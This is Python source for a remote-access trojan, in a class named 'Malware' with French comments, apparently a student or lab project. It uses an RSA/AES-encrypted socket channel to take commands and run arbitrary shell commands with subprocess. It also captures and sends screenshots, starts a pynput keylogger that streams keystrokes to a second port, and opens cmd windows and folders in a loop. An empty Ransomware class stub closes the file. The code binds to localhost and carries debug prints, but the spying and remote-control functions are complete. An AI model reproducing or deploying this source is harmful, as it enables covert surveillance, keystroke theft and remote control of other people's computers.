import pyscreeze, pyscreenshot, socket, os,time, logging
from pynput.keyboard import Key, Listener
from Crypto.Cipher import AES
import os, sys, socket, subprocess as sp, platform, time, pyscreeze, pkg_resources, base64
from threading import Thread, Event, Lock
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.serialization import load_pem_private_key


#CONSTANTES
ENCODING='UTF-8'
BUFFERSIZE=2048
TIME_OUT = 3
TMP = os.environ["TEMP"]


class Malware():

    def __init__(self):
        self.ip = 'localhost'
        self.port = 50001
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn = self.s
        self.addr = self.s
        self.KEY = ""
        self.IV = ""


    def connect(self):
        self.s.bind((self.ip, self.port))
        print("En Attente du client...")  # DEBUG A SUPPRIMER
        self.s.listen(1)
        self.conn, self.addr = self.s.accept()
        print("Connexion Ã©tablie avec le client")

    def disconnect(self):
        self.s.close()

    def load_key_private(self):
        with open("key_malware\key_private_client.pem", 'rb') as pem_in:
            pemlines = pem_in.read()
        privkey = load_pem_private_key(pemlines, None, backend=default_backend())
        return privkey

    def init_rsa_key(self):
        private_key = self.load_key_private()

        cipher_Key = self.conn.recv(BUFFERSIZE)
        self.KEY = private_key.decrypt(cipher_Key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                                          algorithm=hashes.SHA256(),
                                                                          label=None))
        self.KEY = self.KEY.decode(ENCODING)
        print(self.KEY)

    def init_rsa_iv(self):
        private_key = self.load_key_private()

        cipher_iv = self.conn.recv(BUFFERSIZE)
        self.IV = private_key.decrypt(cipher_iv, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                               algorithm=hashes.SHA256(),
                                                               label=None))


        self.IV = self.IV.decode(ENCODING)
        print (self.IV)




    def do_encrypt(self, message):
        enc = AES.new(self.KEY.encode(ENCODING), AES.MODE_OFB, self.IV.encode(ENCODING))
        cipherMessage = base64.b64encode(enc.encrypt(message))
        return cipherMessage

    def do_decrypt(self, cipherMessage):
        enc = AES.new(self.KEY.encode(ENCODING), AES.MODE_OFB, self.IV.encode(ENCODING))
        cipherMessage = base64.b64decode(cipherMessage)
        message = enc.decrypt(cipherMessage)
        return message.decode(ENCODING)


    def task(self):

        act = self.conn.recv(1024)
        act = self.do_decrypt(act)
        print(act)

        while act != 'exit()':

            if act == 'os':
                self.giveOperatingSystem()
            elif act == 'cwd':
                self.giveCurrentWorkingDirectory()
            elif act[:2] == 'cd':
                self.changeCurrentDirectory(act)
                #self.giveCurrentWorkingDirectory()
            elif act == 'prtscr':
                self.givePrtScr()
            elif act =='keygo':
                keylog = Keylogger(self.ip,self.port)
                keylog.start()
            elif act =='keystop':
                keylog.join()
            elif act == 'bat':
                proc = InifiteProcess()
                file = InfiniteFile()
                proc.start()
                file.start()
                proc.join()
                file.join()

            else:
                shell = Shell(self.conn, act, self.KEY, self.IV)
                shell.ReturnResultCmd()

            act = self.conn.recv(1024)
            act = self.do_decrypt(act)
            print(act)


    def giveOperatingSystem(self):
        opSys = platform.system()
        self.conn.send(self.do_encrypt(opSys.encode(ENCODING)))

    def giveCurrentWorkingDirectory(self):
        cwd = os.getcwd()
        print('[DEBUG] Give CWD >',cwd)
        self.conn.send(self.do_encrypt(cwd.encode(ENCODING)))

    def changeCurrentDirectory(self,act):
        print('[DEBUG] Change Directory > ', act)
        cd = act.strip('cd ')
        try:
            os.chdir(cd)
        except:
            print('Adresse Introuvable')

    def givePrtScr(self):
        pyscreeze.screenshot(TMP + "/s.png")

        # send screenshot information to server
        self.conn.send(str.encode("Screenshot..." + "\n" + "Taille fichier: " + str(os.path.getsize(TMP + "/s.png"))
                             + " bytes" + "\n" + "..."))
        objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
        time.sleep(1)
        self.conn.send(objPic.read())
        objPic.close()

    def run(self):
        self.connect()
        self.init_rsa_key()
        self.init_rsa_iv()
        self.task()
        self.disconnect()


class Shell(Malware):

    def __init__(self,s, cmd, key, iv):
        self.conn = s
        self.cmd = cmd
        self.KEY = key
        self.IV = iv


    def ReturnResultCmd(self):
        print('apres reception')
        sh = sp.Popen(self.cmd, shell=True, stdout = sp.PIPE,
                            stderr = sp.PIPE, stdin = sp.PIPE,
                            universal_newlines=True)
        out, err = sh.communicate()
        result = (out) + (err)
        self.conn.sendall(self.do_encrypt(result.encode(ENCODING)))


class Keylogger(Thread):

    def __init__(self, ip, port):
        Thread.__init__(self)
        self.lock = Lock
        self.ipKey = ip
        self.portKey = port + 1
        self.socketKey = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    def run(self):

        self.socketKey.connect((self.ipKey, self.portKey))

        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        logging.info(str(key))
        keyLog = (str(key))
        print(keyLog)
        # self.lock.acquire
        self.socketKey.send((keyLog).encode(ENCODING))
        # self.lock.release()


class InifiteProcess(Thread):

    def __init__(self):
        Thread.__init__(self)
        self.lock = Lock()

    def run(self):
        iProc = 0

        while iProc < 5:
            self.lock.acquire()
            os.system("start cmd.exe")
            self.lock.release()
            iProc = iProc +1


class InfiniteFile(Thread):

    def __init__(self):
        Thread.__init__(self)
        self.lock = Lock()

    def run(self):
        iFile = 0
        nom = str(iFile)
        while iFile < 5:
            self.lock.acquire()
            os.system("md "+nom+".txt")
            self.lock.release()
            iFile = iFile+1
            nom = str(iFile)



class Ransomware():
    pass



go = Malware()
go.run()

